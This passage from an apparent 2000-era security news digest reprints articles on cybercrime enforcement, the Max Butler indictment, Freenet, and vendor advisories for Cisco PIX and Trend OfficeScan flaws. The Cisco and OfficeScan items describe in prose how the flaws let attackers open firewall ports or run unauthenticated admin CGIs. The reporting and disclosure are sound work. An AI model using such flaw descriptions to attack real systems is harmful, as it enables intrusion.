            Underwood said the experience would likely make him
     pause the next time he is prompted to enter personal
     information on a Web site.
            .I was just getting to the point where I was reasonably
     comfortable doing that, but I may have to think twice if this
     is how it works,. he said.

62.0  HNN:Mar 23rd:Cisco Admits to Big Hole in PIX Firewall 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      contributed by acopalyse 
      Last week Cisco admitted that it is possible to fool the
      PIX stateful inspection into opening up arbitrary TCP
      ports, which could allow attackers to circumvent
      defined security policies. The vulnerabilities effect any
      PIX firewall that has enabled FTP which is turned on by
      default.

       Networking   John Leyden, Network News  [22 Mar 2000]
 
      Cisco admits to serious PIX firewall flaw
 
 
      Cisco last week admitted that two security vulnerabilities
      affecting its PIX firewalls could leave corporate networks
      open to attack. 
 
      In an interim security notice, the vendor acknowledged the
      existence of two related vulnerabilities that both cause its
      Secure PIX Firewalls to interpret FTP (File Transfer Protocol)
      commands out of context, leaving the networks behind the
      firewalls open to penetration. 
 
      Cisco said that in certain configurations "it is possible to fool
      the PIX stateful inspection into opening up arbitrary TCP
      ports, which could allow attackers to circumvent defined
      security policies". 
 
      All Cisco Secure PIX Firewalls with software versions up to
      and including 4.2(5), 4.4(4), and 5.0(3), that are configured
      to provide access to FTP services, are at risk from both
      vulnerabilities. Cisco admitted that the problem means any
      Cisco Secure PIX Firewall that has enabled the fix-up
      protocol FTP command could allow unauthorised data to
      reach the network it is designed to protect. 
 
      Deri Jones, managing director of security tester NTA Monitor,
      described the issue as "serious", particularly because Cisco's
      offering is currently the third most popular firewall in the
      market. 
 
      "To Cisco's credit it has issued a bulletin, but has not yet
      found any solutions. This will not be trivial to address and
      may take it some time," warned Jones. 
 
      Clive McCafferty, managing director of security consultant
      CenturyCom, said that many users, which include BT, use
      Cisco's PIX firewalls for managed services. 
 
      "This could allow an attacker to send spurious stuff and then
      launch an attack when a port is open," said McCafferty. 
 
      The first vulnerability, which remains unfixed, is exercised
      when a client inside the firewall browses to an external
      server and selects a link that the firewall interprets as two or
      more FTP commands. The client begins an FTP connection as
      expected, and at the same time unexpectedly executes
      another command opening a separate connection through
      the firewall. 
 
      The only solution Cisco currently suggests for this problem is
      disabling incoming FTP services. Any server that permits
      internal clients to make arbitrary outbound FTP connections
      may be vulnerable to this issue. 
 
      The second, related problem is exercised when the firewall
      receives an error message from an internal FTP server
      containing an encapsulated command that the firewall
      interprets as a distinct command. This can be exploited to
      open a separate connection through the firewall. 
 
      Both vulnerabilities are due to the command fix-up protocol
      FTP (portnum), which is enabled by default on the Cisco
      Secure PIX Firewall. To exploit the security flaws, attackers
      must be able to make connections to an FTP server
      protected by the PIX Firewall.

      FBI installs new task force aimed at fighting cybercrimes
    
      By Erik Siemers
      TRIBUNE-REVIEW
    
      The aqua Macintosh G3 computer, its electronic guts
      exposed, appeared harmless as it sat on a table in the
      Pittsburgh FBI offices Tuesday. 
    
      But its hard drive tells investigators a different story - it
      was used to print counterfeit corporate checks. 
    
      That Macintosh is one of the computers under
      examination by the Pittsburgh High Tech Computer
      Crimes Task Force. 
    
      The medley of federal and local authorities trained to
      investigate computer-related crimes was unveiled
      yesterday 
    
      The task force, one of the first in the nation, pools
      experts from local agencies such as Pittsburgh police
      with federal agencies such as the Secret Service and the
      Internal Revenue Service into one room to combat the rapid growth of cybercrimes. 
    
      "Crimes we couldn't have conceived years ago are now routine," said U.S. Attorney Harry S.
      Litman, whose office is involved in the task force. "It is critical that we respond to these crimes by
      marshaling our resources." 
    
      Western Pennsylvania is open to crimes such as hacker attacks and "a whole array of Internet
      fraud," partly because it has more software development firms than Silicon Valley, Litman said. 
    
      "Our position poses significant vulnerability to cybercrimes," Litman said. 
    
      The task force will be free to use each agency's resources along with those at Carnegie Mellon's
      Computer Emergency Response Team, said Richard D. Pethia, manager of CERT's networked
      systems survivability program. CERT will provide technical assistance to the task force, Pethia said. 
    
      Each agency offers one representative to the task force who has been trained in forensic
      examinations of computers, said Dan Larkin, supervisor in charge of the FBI's White Collar and
      Computer Crimes Division. 
    
      Aside from providing intelligence and technical assistance to computer investigations, the task force
      will focus on investigations where the Internet was used as the main tool in committing the crime. 
    
      Michael Vatis, director of the FBI's National Infrastructure Protection Center in Washington, D.C.,
      said all FBI field offices will eventually house task forces similar to Pittsburgh's. 
    
      Pittsburgh is one of the initial task force sites partly because "we have a wealth of talent," said John
      P. Joyce, assistant special agent in charge of the FBI's Pittsburgh office. 
    
      The city also has a good track record for law enforcement agencies working with each other and
      with Carnegie Mellon's technology resources, said FBI Special Agent Bill Crowley. 
    
      Task force members will use traditional investigation skills along with advanced knowledge of
      technology to crack computer cases, said Vatis. 
    
      "We need to have the technology to get the digital evidence," Vatis said. 
    
      Getting that digital evidence can be as simple as copying the contents of the hard drive for analysis
      on its own computers, said Special Agent Tom Hyslip, the Secret Service's representative to the
      task force. 
    
      "When we go to court we can say we never touched (the evidence)," Hyslip said.

      City at forefront of war on cybercrime 

      FBI forming task forces to fight crimes of Internet age 
 
      Wednesday, March 22, 2000
 
      By Torsten Ove, Post-Gazette Staff Writer 
 
      With its aging population and Rust Belt image, Pittsburgh may hardly seem
      like the kind of town the federal government would choose as a base for its
      war on sophisticated cybercrime. 
 
      But yesterday, as local law enforcement officers stood stiffly for the cameras
      at FBI headquarters Downtown, authorities announced the creation of the
      nation's first task force specifically designed to combat computer intrusion,
      Web site vandalism, on-line espionage and other crimes of the rapidly
      evolving Internet age. 
 
      "This is the future, but it is also very much the present," said Michael Vatis, the
      FBI's top cybercop. "This is putting Pittsburgh at the cutting edge of
      cybercrime prevention." 
 
      The task force, comprised of federal, state and local agencies, is one of 16
      planned nationwide in major cities. 
 
      Pittsburgh was chosen because of the prevalence of software development
      companies here and the presence of Carnegie Mellon University's Computer
      Emergency Response Team, the nation's leading cybercrime research facility. 
 
      In addition to focusing on complex computer and Internet crimes, FBI officials
      said the local task force will provide technical assistance to police
      departments in investigations of fraud, child pornography and identity theft that
      involve computers. 
 
      Vatis, director of the National Infrastructure Protection Center in Washington,
      D.C., said computers are changing the face of crime so quickly that law
      enforcement agencies have to work together to keep up. 
 
      In addition to working to combat large-scale attacks such as the one that
      disabled Yahoo!, eBay and other e-commerce Web sites last month, federal
      authorities have been scrambling to head off all manner of computer crimes,
      from organized hacking of government computers by suspected foreign agents
      to amateur vandalism such as that committed by the teen-ager who vandalized
      an anti-drug Web site with pictures of Beavis and Butthead. 
 
      Locally, FBI Special Agent John P. Joyce said his agency is investigating 30
      to 40 cases of computer intrusion and similar crimes, although he wouldn't
      reveal details of any of them. Because of their technical nature, each
      investigation requires much more expertise than the traditional capers tackled
      by FBI agents of old. The new breed of federal crime fighter is more likely to
      be an agent sitting at a computer all day than a suit-and-tie swashbuckler with
      a gun kicking down doors. 
 
      "These cases are a lot more complicated than physical crime," said Vatis, "and
      they take a longer time to solve." 
 
      Richard D. Pethia of CMU's CERT warned that the "denial of service"
      attacks that knocked the Internet companies off-line in February are only the
      beginning of new waves of cyberspace assaults. In 1998, he said, his center
      examined 4,000 incidents. Last year, the number reached 8,000. This year, it
      could double again. 
 
      "This problem is real and it's here," he said. "The nasty thing about computer
      attacks is that they can be launched from anywhere on the planet." 
 
      And it can be nearly impossible to track down the culprits and then prove
      they are responsible for specific on-line exploits. The attacks on the
      e-commerce companies, for example, remain unsolved, although Vatis said
      the FBI is making progress in the case. 
 
      Not everyone is convinced the federal government, working with experts in
      the private sector, has what it takes to match wits with serious hackers bent
      on mayhem. 
 
      "If I were a cyber criminal with the FBI after me, I would sleep like a baby,"
      said Jay Valentine, president of InfoGlide Corp., an Internet security
      company, in a recent Scripps Howard report about Internet security. "Even a
      blind squirrel finds a nut, but the FBI will only catch amateurish hackers. The
      best ones are a generation ahead of the FBI."
 
      Other critics have blasted the FBI and the National Infrastructure Protection
      Center for reacting too slowly to the attacks on 30 university systems last year
      that laid the groundwork for the e-commerce shutdown last month. 
 
      In a USA Today report, experts -- many of them cybersleuths selling their
      services -- also said the government's efforts were hindered by inter-agency
      squabbling and the fact that some companies don't trust the FBI enough to
      share information with agents. 
 
      Vatis wouldn't address the USA Today report except to say that it was
      inaccurate. 
 
      Regarding the charge of slow government reaction, he said the protection
      center issued a warning about the denial-of-service threat in plenty of time. 
 
      The National Infrastructure Protection Center's Web site shows the warning
      went out on Dec. 30 and included detailed information about what defensive
      steps to take. 
 
      Still, Vatis acknowledged that government agencies are "still in the process of
      getting up to speed."

      Bill Would Protect Firms That Share Hacking Info 

                  
      By David McGuire, Newsbytes WASHINGTON, DC, U.S.A., 21 Mar 2000, 6:00 AM 
      CST

      A new bill aimed at encouraging companies to share information about 
      hacker attacks would provide firms with a limited exemption from the 
      Freedom of Information Act (FOIA). 

      Set to be introduced by Reps. Tom Davis, R-Va. and Jim Moran, D-Va., later 
      this week, the legislation would allow companies to share information 
      about cyberattacks with law enforcers and industry groups, without 
      worrying that such information could come back to haunt them, Davis 
      staffer David Marin said today. 

      "The public interest will be served by companies coming forth to share 
      their information" about attacks, Marin said. Too often now companies do 
      not report cyberattacks for fear that such reports will find their way 
      into the media, he said. 

      While the bill would create a limited shelter under FOIA, it is not 
      intended to allow companies to mask their business dealings, Marin said. 

      When the legislation is completed it will be "narrowly tailored to address 
      (information pertaining to) how the attack was done and what was done to 
      fix the attack," Marin said. The legislation will apply only to 
      telecommunications and information technology infrastructure attacks. 

      Used primarily by the media, FOIA allows members of the press and the 
      public to file legally binding requests for public documents. 

      FOIA already contains an exemption for ongoing criminal investigations, by 
      Davis and Moran are aiming to further protect firms that divulge 
      information about cyberattacks, Marin said.

           Teen hackers face
          deterrent sentences

      Three teenage computer hackers were warned
      yesterday that they faced deterrent sentences after they
      admitted selling login names and passwords stolen from
      the Internet in the first case of its kind in Hong Kong. 

      One of the trio, a student, was also convicted of
      downloading songs from the Internet and selling them
      for profit. 

      At Eastern Court, restaurant manager Tam Hei-lun and
      clerk Po Yiu-ming, both 19, and student Mak
      King-lam, 18, pleaded guilty to a total of 49 charges. 

      Magistrate Ian Candy remanded them in custody for
      sentencing on April 5, pending reports, and said: "It is
      precisely these kind of computer crimes which leave
      Internet users in fear and make them pause before
      conducting even the most basic of transactions. 

      "These criminal activities should be nipped in the bud
      and a deterrent sentence must be imposed." 

      All the offences took place between March 1998 and
      May last year. 

      David Leung, prosecuting, told the court Po had hacked
      into other Internet users' computers and unlawfully
      obtained 127 login names and passwords given to
      Internet users when they subscribe to an Internet service
      provider for a monthly fee and an hourly rate. 

      The three defendants knew each other through the
      Internet and Po had sold some of his illegally obtained
      login names and passwords to Tam for $3,000, but
      gave others for free to Mak. Tam later resold them for
      $1,500. 

      The three were aware that the information they obtained
      was acquired illegally, the magistrate was told. 

      Mr Leung said the three defendants had hacked into the
      accounts of Internet users of Hongkong Telecom IMS
      Netvigator, Vision Network Ltd, City Telecom (HK),
      Netfront Information Technology and ABC Net, saving
      themselves the monthly fees and causing losses to the
      account holders. 

      Tam admitted 14 counts of obtaining access to a
      computer with a view to dishonest gain, Po admitted 12
      and Mak two. 

      Mak also admitted 10 charges of selling pirated discs, in
      which he downloaded songs from the Internet and sold
      200 discs from his own Web site. Each disc contained
      100 songs and was priced at $88. 

      Tam, who asked buyers of the logins to deposit money
      into his bank account, also admitted eight counts of
      dealing with property known or reasonably believed to
      represent proceeds of an indictable offence. 

      Po admitted a further three charges of criminally
      damaging the computers of three users.

      FBI Computer Expert Accused of Hacking 

      Henry K. Lee, Chronicle Staff Writer 

      Friday, March 24, 2000 



      Max Ray Butler seemed to be at the top of his game. For two years, the 
      computer expert was a confidential source for an elite FBI computer crime 
      squad, helping to ferret out scofflaws on the Internet. 

      Butler, also known as Max Vision, was also a self-described ``ethical 
      hacker'' from the Silicon Valley who boasted that he could test the 
      security of any computer system by penetrating it. 

      But Butler's cyber activity went too far, federal authorities say. 

      Butler, 27, of Berkeley appeared in federal court in San Jose yesterday on 
      a 15-count federal indictment charging him with hacking into computers 
      used by the University of California at Berkeley, national laboratories, 
      federal departments, air force bases across the country and a NASA flight 
      center. 

      Butler posted $50,000 cash bail yesterday after U.S. Magistrate Judge 
      Patricia Turnbull ordered him not to use computers except for work. Butler 
      and his attorney, Jennifer Granick of San Francisco, could not be reached 
      for comment. 

      The indictment, handed down March 15, said Butler caused ``reckless 
      damage'' as a result of intrusions in May 1998. Butler was also charged 
      with possession, with intent to defraud, of 477 passwords belonging to 
      customers of a Santa Clara- based Internet service provider. 

      The case underscores the potential risks involved when law-enforcement 
      agencies use confidential informants with access to sensitive information. 

      ``Sources are often very close to criminal activity, and sometimes they 
      cross the line,'' said Special Agent George Grotz, an FBI spokesman in San 
      Francisco. 

      Grotz declined to say how Butler became an FBI informant and whether he 
      was a federal source at the time of the alleged crimes. Grotz said Butler 
      is no longer associated with the agency. 

      Friends of the suspect told the Associated Press that Butler was caught 
      possibly violating the law several years ago and began working with the 
      FBI to avoid charges. Seth Alves, 27, told the news agency that Butler was 
      unfairly targeted after refusing to comply with an FBI request. 

      A 22-month investigation by the FBI and military investigators ended 
      Tuesday morning when federal agents converged on a home on Dwight Way near 
      the UC Berkeley campus, where Butler lives with his his 23-year-old wife, 
      Kimi Winters. No one answered the door. Butler turned himself in to the 
      FBI in Oakland later that day. 

      Butler grew up in Idaho and lived with his family in Washington, where 
      authorities said he has a 1997 misdemeanor conviction for attempted 
      trafficking of stolen property. 

      He developed a proficiency with computers, eventually attracting the 
      attention of the FBI's Computer Crime Squad, which used him as a 
      confidential informant. 

      An FBI search warrant affidavit said Butler was ``well known'' to squad 
      members and ``has provided useful and timely information on computer 
      crimes in the past.'' 

      In 1997, Butler started a company known as Max Vision in Mountain View, 
      specializing in ``penetration testing'' and ``ethical hacking'' procedures 
      in which he would simulate for clients how a hacker would penetrate their 
      computer systems, according to the company Web site. 

      ``Our client penetration rate is currently 100 percent,'' the site said, 
      with recent clients including a large consortium of telecommunications 
      companies, a major motion picture company and an e-commerce online auction 
      service. 

      By 1998, Butler was living with Winters in a one-story San Jose apartment, 
      where the couple started up their own Web-design company, Kimi Networks, 
      records show. Reached by telephone yesterday, Winters hung up on a 
      Chronicle reporter.

      It was also from that apartment, according to the FBI, that Butler hacked 
      into computers by using a computer software vulnerability known as a 
      buffer overflow, which sends commands into a system that ordinarily would 
      not be allowed. 

      Butler also allegedly invaded computers used by the Lawrence Berkeley 
      National Laboratory. Vern Paxson, a computer scientist at the lab, noticed 
      an online intruder conducting unauthorized scans of laboratory and UC 
      Berkeley computers in May 1998 and used a monitoring device that later 
      helped identify the source of the intrusions. 

      Paxson said yesterday that Butler's arrest was ``somewhat ironic'' but 
      ``not totally surprising.'' 

      Paxson said a person later identified as Butler even sent him an 
      apologetic e-mail a day after the computer intrusions. Butler also somehow 
      obtained
      a confidential incident report Paxton had filed about
      the invasions, Paxson said.

      Ex-FBI source charged with hacking 

      SAN JOSE, Calif., March 23 (Reuters) - A man officials say was once a 
      confidential FBI source on computer hackers has been charged with 
      allegedly breaking into computer systems belonging to NASA, the military 
      and the U.S. departments of energy, defense and transportation, the U.S. 
      Attorney's office said. 

      Max Ray Butler, 27, also known as Max Vision, was due to appear in court 
      on Thursday to face charges of breaking into and damaging computers as 
      well as possessing the passwords of customers of California Internet 
      service provider Aimnet. 

      The indictment's 15 counts carry fines ranging from $5,000 up to $250,000 
      and jail terms totaling more than 50 years in prison, said officials at 
      the U.S. Attorney's office in San Francisco. 

      A Federal Bureau of Investigation affidavit filed to support a search of 
      his home showed Butler, of Berkeley, Calif., was a confidential source for 
      FBI agents tracking computer crimes before authorities began their 
      22-month investigation of him in May 1998. 

      Butler, being held in lieu of $100,000 bond, surrendered on Tuesday to 
      authorities in Oakland. He was scheduled to attend a bail review hearing 
      on Thursday in U.S. District Court in San Jose. 

      The arrest comes amid growing concern over a number of recent high-profile 
      computer hacker attacks. 

      But authorities said there is no connection between Butler and the 
      "denial-of-service" attacks in early February that temporarily cut off 
      customers to some of the Web's biggest sites, including Yahoo!, eBay , 
      Amazon.com and E-Trade. 

      "There are no allegations related to denial-of-service attacks but we 
      would characterize this as a serious case," said U.S. attorney Ross 
      Nadler, chief of the office's newly created Computer Hacking and 
      Intellectual Property unit. 

      Lawyers for Butler could not be reached for comment. 

      The FBI, the U.S. Air Force, NASA and the U.S. Navy began an investigation 
      after several U.S. Air Force computer systems around the country were 
      attacked in May 1998, although it was unclear when Butler became their 
      focus. 

      Butler is accused of hacking into computers belonging to the U.S. 
      Department of Energy's Argonne National Laboratories in Illinois and the 
      Brookhaven National Laboratory in New York; NASA's Marshall Flight Center 
      in Alabama; the office of the Secretary of Transportation in Washington, 
      D.C.; the office of the Secretary of the Department of Defense in 
      Washington, D.C.; and unspecified facilities of the Department of Defense, 
      and IDSoftware of Mesquite, Texas.

      Max Butler is charged with hacking into computers and destroying information.
      One of the organizers of the local conference, Dragos Ruiu of Dursec-dot-com,
      says that Butler was very well known among those in the information technology
      sector.

      "He ran an intrusion database, kind of like a big listing of signatures that
      people use towatch for hackers intruding into their network, and it was quite
      a famous data base," said Ruiu. "Lots of Fortune 500 companies and big sites 
      use his database as a way of protecting their networks." 

      Ruiu is now scrambling to find a replacement for Butler. The conference 
      runs May 10-12.

       inject W300 million to host the First World Information Protection Contest
       (WIPC) in June. 

       The contest will have hackers attempt to break into a firewall the center has
       built. A total of W100 million prize money is prepared for the event, which
       aims to find out the international standard of hackers and to test the capacity
       of Korean information protection technology.

      British Intelligence Laptop Stolen at Station

      LONDON (Reuters) - British police said Friday they were hunting a thief 
      who had stolen a secret service computer containing confidential 
      information on Northern Ireland.

      The laptop computer was snatched while an employee of Britain's domestic 
      security service, MI5, was buying a ticket at London's Paddington train 
      station.

      ``I can confirm that a laptop computer was stolen from the security 
      service employee on March 4 at Paddington Underground (station),'' said a 
      government official who declined to be identified.

      ``The information contained in the laptop was well protected and we 
      believe it to be secure. We are not prepared to discuss the nature of the 
      material.''

      The information on the computer was understood to be heavily encrypted and 
      was related to the situation in Northern Ireland, but not to refer to the 
      state of the peace process or any guerrilla threat.

                              A spokesman for Prime Minister Tony Blair said 
                              officials were always concerned at the loss of any 
                              sensitive material, but they were confident it was 
                              secure and that national security had not been 
                              threatened.

                              ``We believe this is an opportunistic theft and 
                              not a deliberate attempt to gain access to 
                              security service information,'' he said.

                              Asked why agents were walking around with security 
                              information on computers, the spokesman said there 
                              were strict procedures for moving classified 
                              material. ``You can certainly say they've been 
                              tightened since this incident,''                               
                              he added.

      The Sun newspaper said a squad of 150 police were working around the clock 
      to catch the thief. Before the start of the 1991 Gulf War in Kuwait and 
      Iraq, a laptop said to have contained war plans was stolen from the car of 
      a Royal Air Force officer, who       lost his job as a result.

      The latest theft comes as the peace process in Northern Ireland is in 
      disarray.

      Last month Britain decided to suspend a fledgling home-rule government 
      over lack of progress on disarmament by Irish Republican Army guerrillas.

      Trend Micro has released a patch that eliminates server security

      versions, running on Windows NT 4 server with Internet Information
      Server(IIS).

      Patch available for OfficeScan vulnerability
      Posted to BugTraq on March 24, 2000
 
      Security Focus BugTraq ID: 1057
 
      Posted: March 22, 2000
 
      Summary
      =======
      Trend Micro has released a patch that eliminates server security
      vulnerabilities found on OfficeScan Corporate Edition 3.51 or earlier
      versions, running on Windows NT 4 server with Internet Information
      Server (IIS). These versions of OfficeScan allow intruders within a
      firewall to invoke OfficeScan CGIs on the server without
      authentication - bypassing OfficeScan management console
      password protection. These OfficeScan CGIs are intended for
      administrator to manage OfficeScan antivirus running on networked
      workstations via the OfficeScan management console. By gaining
      access to execute these CGIs, hackers can use them to change
      OfficeScan antivirus configurations or to uninstall OfficeScan
      antivirus on thedesktops.
 
      Issues
      ======
      Trend OfficeScan version 3.51 or earlier versions apply inadequate
      security settings on the OfficeScan server CGI components. If a
      malicious user, has the ability to connect to the OfficeScan server
      via a web browser, these CGIs can be executed to send valid
      commands - including uninstall command - to OfficeScan clients. In
      addition, OfficeScan's implementation of user authentication in its
      management console - password protection - was insufficiently
      encrypted, and allows a malicious user to decrypt and gain access
      to the OfficeScan management console. 
 
      Implementation
      ==============
      Trend Micro has released a patch that will secure access to the
      OfficeScan CGIs on the server. The patch program changes the file
      permissions on the OfficeScan CGIs, so only administrators can
      access and execute them. This patch works only on drives
      formatted to use Windows NT file system (NTFS). After applying this
      patch, hackers will no longer be able to remotely invoke OfficeScan
      CGIs without being authenticated as a administrator by NTFS
      security. This patch also prevents hackers, who sniffs for OfficeScan
      management console password over the network, from gaining
      access to the OfficeScan management console. Access to the
      OfficeScan management console or to execute OfficeScan CGIs
      now requires NTFS authentication.
 
      Affected Software Versions
      ==========================
      Trend OfficeScan Corporate Edition 3.0
      Trend OfficeScan Corporate Edition 3.11
      Trend OfficeScan Corporate Edition 3.13
      Trend OfficeScan Corporate Edition 3.50
      Trend OfficeScan Corporate Edition 3.51
      Trend OfficeScan for Microsoft SBS 4.5
 
      This vulnerability is only present when the above software version is
      installed on a Windows NT server with IIS. It is not present when the
      above software version is installed on Novell NetWare servers or
      Windows NT server without IIS.

      Privacy, security on the Web require business
      know-how 

      FCW's Dot-gov Thursday column

      BY Rich Kellet 
      03/23/2000 

      The idea that privacy and security might be symptoms and not the problem emerged
      from a recent Webmaster focus group discussion with the Office of Personnel
      Management on defining Webmaster classifications. 

      We worked through the usual issues of defining technology Webmasters and content
      Webmasters. As we moved from the discussion of specialists to the issue of World
      Wide Web managers, an interesting perspective emerged from our discussions.
      Anecdotes and informal surveys are showing that about half of the Webmaster
      community works in mission-oriented program offices, which are not information
      technology organizations. 

      This led to a discussion of the difference between managers in program
      organizations and managers in technology organizations. Web managers in program
      organizations tend to be business managers and Web managers in IT organizations
      tend to be technology managers. The conclusion of this discussion was to define a
      "breed" of Web manager under an IT series that is a technology manager or "Web
      technology manager" 

      So, what about the concept of a classification for a Web business manager? I asked
      the group if anyone knew of a classification for business managers in the federal
      government. To my surprise, there does not appear to be one. 

      It is important to pause at this point and consider what this means. Individuals who
      obtain business degrees, undergraduate or higher, have qualifications in an area
      recognized by the private sector as a unique skill and a profession in its own right.
      These skills are essential to running large programs that deliver the governments
      products and services to the public or other agencies. 

      When I developed the top skill areas that a federal Web manager needs so that the
      Webmaster can deliver programs online, to my own surprise, most of the required
      skills originated from business skills, such as accounting and financial management
      and budgeting. 

      As I looked across government, I found surprisingly little information on what it
      means to run a business in the federal government context. There is plenty of
      information on, for instance, project management, but managing a project is not
      running a business. There is plenty of information on policy, but carrying out policy
      is not a running business. There is plenty on management, but management skills are
      not the only skills required to run a business. 

      Courses in small business or college programs in business administration provide
      samples of the curriculums that define the skills needed to run a business. Running a
      business over the Web in government is about understanding, integrating and
      applying principles and processes related to leadership, culture, business processes
      and components, management, policy, and technology into a functioning
      organization that delivers a set of products and services to the public or other
      agencies. 

      The issues of privacy and security are difficult to incorporate into Web sites
      because they challenge our abilities as business managers. Privacy and security are
      not "modules" you can buy off the shelf. It is not solely a technology issue, a people
      issue or a system issue. Privacy and security are "embedded and threaded"
      throughout the business processes, the organizations working knowledge and the
      supporting technology infrastructure. 

      At each level of the architecture and in the operations of the business, people and
      assets (routers, servers, operating systems and other components) Web masters
      must incorporate privacy and security concepts and solutions. To solve privacy and
      security requires a commitment to re-inventing business processes, developing the
      organizations business and technology skills, and improving the underlying
      infrastructure. 

      This is the stuff of a Web business manager. This is far beyond just "plugging holes"
      in operating systems or applications. Solving privacy and security is an
      enterprisewide issue that requires Web business leaders working with other business
      leaders in the agency. 

      With the Web becoming the central construct for delivering products and services,
      the government is going to need Web business managers. We have many now, and
      we need to continue to grow this portion of the work force. 

      So, where does that leave us? Not surprisingly, it is a business decision to decide
      whether to solve these issues by funding them appropriately, to develop business
      processes that incorporate privacy and security, and to build and continuously
      improve our organizational knowledge for putting in place privacy and security
      solutions. We can spend a lot of time on chasing privacy or security holes or solve
      the problem more efficiently and in less time by looking at the whole business.

      Authorities target online

      Law enforcement officials from 27 countries and
      45 states have conducted a massive sweep of
      the Internet searching for "get-rich-quick"
      schemes and scams, the Federal Trade
      Commission said Thursday. 
 
      More than 1,600 sites were uncovered in the
      "Get-Rich-Quick.con" program, one of several
      "surfs" the agency conducted looking for problems
      and crimes on the Net. 
 
      The latest sweep hooked up law enforcement
      officials across state and national borders and
      involved hundreds of researchers who scoured the
      Net for scam artists. 
 
      Many languages, one voice "We want them to know
      that the borderless Internet marketplace is not a free
      zone for fraud," said Jodie Bernstein, director of the
      FTC Bureau of Consumer Protection. "Though we
      speak different languages on the subject of Internet
      fraud, we speak with one voice. Our message is:
      Con artists will not threaten the safety of the Net." 
 
      'We're going to run them out of town, and run them
      off the Web'|Drew Edmondson, Oklahoma attorney
      general Some of the schemes promised users
      rewards such as "surf the Net and earn $100 an
      hour," he said. Authorities also found a variety of
      pyramid schemes, outrageous product claims and
      outright fraud. 
 
      The sites are sent e-mail warnings, and
      documentation of the sites is provided to law
      enforcement agencies in the various jurisdictions,
      which will be able to further investigate and press
      charges, if necessary. 
 
      Bernstein said the agencies could begin filing
      charges in June or July. 
 
      Calling out the cyberposse "As an old prosecutor I'm
      looking forward to Phase Two. Once we've
      investigated, as the old sheriff would do, we're going
      to run them out of town and run them off the Web,"
      said Drew Edmondson, Oklahoma attorney general.
      "And where appropriate we'll put them in jail." 
 
      It came as no surprise to speakers at Thursday's
      news conference that con artists have migrated
      onto the Web. About half of the U.S. Postal
      Service's mail fraud investigations begin as online
      solicitations, said Lawrence Maxwell, USPS
      inspector in charge of fraud, prohibited mailings and
      forfeiture investigations. 
 
      It's easy for con artists to target consumers "in an
      age dominated by a 'Who Wants to be a Millionaire'
      mentality," said Richard Walker, enforcement
      director for the Securities and Exchange
      Commission.

      Daily News
      Freenet Raises Security
      Fears
      By Martin Stone, Newsbytes
      March 24, 2000
 
      A report by a British scientific magazine suggests that an
      anonymous Internet system designed to guarantee free speech
      online could be used by child pornographers, terrorists and
      others with less-than-pristine purposes.
 
      A Reuters report today said a New Scientist magazine article
      on the Freenet program, which was created by Edinburgh
      University graduate Ian Clarke and others to make tracing file
      originators impossible, thereby giving dissidents in countries
      without free speech a voice, could be misused by those with
      sinister designs.
 
      The report stated that the Internet Watch Foundation, an
      independent body monitoring Web sites in Britain, fears the
      decentralized system could make policing the Net and tracking
      down computer crimes even more difficult.
 
      "There is clear potential for misuse by criminals, terrorists and
      pedophiles," Roger Darlington, chairman of the foundation, told
      the weekly magazine in its latest issue, Reuters reported.
 
      Users of Freenet are difficult to track down because files do not
      contain a unique Web address and are distributed on
      computers belonging to Freenet members. To retrieve a file,
      users enter the key, Reuters said.
 
      According to Clarke, a single computer user cannot be held
      responsible for Freenet files because the originator cannot be
      traced.
 
      "It's perfect machine anarchy," he is quoted as saying. "No
      single computer is in control."

      Alternative Net Protects Pirates 
      by Leander Kahney 

      3:00 a.m. 8.Mar.2000 PST 
      Open-source advocates are developing an alternative publishing network 
      that promises to provide true anonymity in sharing documents and files 
      over the Internet. 

      But in addition to protecting free speech, the new system also could be a 
      boon for multimedia pirates. 

      Freenet is an open-source file-transfer system similar to the Web for 
      sharing digital content such as HTML pages and MP3 music files. It will be 
      run by connected clusters of servers or node stations that could in turn 
      be run on almost any PC connected to the Internet. 

      But unlike the Web, Freenet has no centralized administrative 
      infrastructure of domain name servers (DNS) and IP addresses that can be 
      used to track users. Hosting and replicating documents and files requires 
      that Freenet backers volunteer their time and resources. 

      Because Freenet aims to be anonymous, secure, and without centralized 
      control, it would make it almost impossible to trace people who post 
      content -- legal or otherwise -- onto the network. 

      "My primary motivation was to make it very difficult to censor 
      information," said Ian Clarke, an Irish programmer who designed the 
      system. "With the Internet there's the potential to censor and monitor 
      people to a degree that's never been possible before. I wanted to develop 
      the technology to make this impossible."

      Clarke started work on Freenet 18 months ago as a graduate student in 
      artificial intelligence at Edinburgh University. 

      He had been outraged by the Australian government's proposal to introduce 
      sweeping censorship laws, which went into effect in January.

      Clarke hopes to launch the first public version in the spring, but he said 
      the system is still pretty rough. The server is nearly finished, but so 
      far there are no browsers, or clients, to make the network easy to use.

      Freenet software will be released under the GNU public license, which will 
      allow anyone to freely distribute and change the source code. The system 
      is being written in Java by about a dozen programmers internationally. 
      They have never met nor even spoken over the phone -- all communication is 
      by email, Clarke said. 

      Both authors and readers can choose to be anonymous if they so wish, 
      Clarke said. Like the Web, the network is navigated by a client, or 
      browser. 

      He said it will even be difficult to determine if someone is running a 
      Freenet server and what information is being stored on it, Clarke said. 

      Alex Fowler of the Electronic Frontier Foundation said that while he 
      generally supports anti-censorship tools, Freenet could create as many 
      problems as it solves. 

      Fowler said that Freenet could be a useful tool in countries like 
      Singapore or China that censor the Net or quash free speech. But he 
      doesn't like the idea that you wouldn't be able to remove sensitive 
      information -- such as someone's medical records.

      "There's no way to tell if a project like this will actually take off," he 
      said. "It's certainly going to raise some questions with a whole lot of 
      people. Not just copyright holders, but governments too."

      Patrick Ball, deputy director of the Science and Human Rights Program with 
      the American Association for the Advancement for Science, said tools like 
      anonymizers, strong cryptography, and Freenet tend not to help activists 
      who are not already under surveillance because using them is in itself 
      suspicious and tends to alert the authorities. 

      "I'm for any application that protects dissidents," he said. "But there's 
      a higher order problem that's very difficult to get around, and that's by 
      using these tools you draw attention to yourself." 

      Although Clarke designed Freenet to protect free speech, he thinks that 
      the safeguards they are building in to make it difficult to track down 
      those who distribute content could lead to its notoriety as a vehicle for 
      copyright piracy.

      The system was designed to make it impossible to find out where files are 
      physically stored. Information posted to the network is stored on multiple 
      servers simultaneously, making it difficult to remove a file. 

      In fact, Clarke said any attempt to remove information causes it to be 
      copied to other servers on the network. 

      The only way to remove information is to disable the entire network, which 
      may prove difficult if it becomes popular and is running on thousands of 
      PCs all over the globe.

      However, Clarke said the network cannot be guaranteed to permanently store 
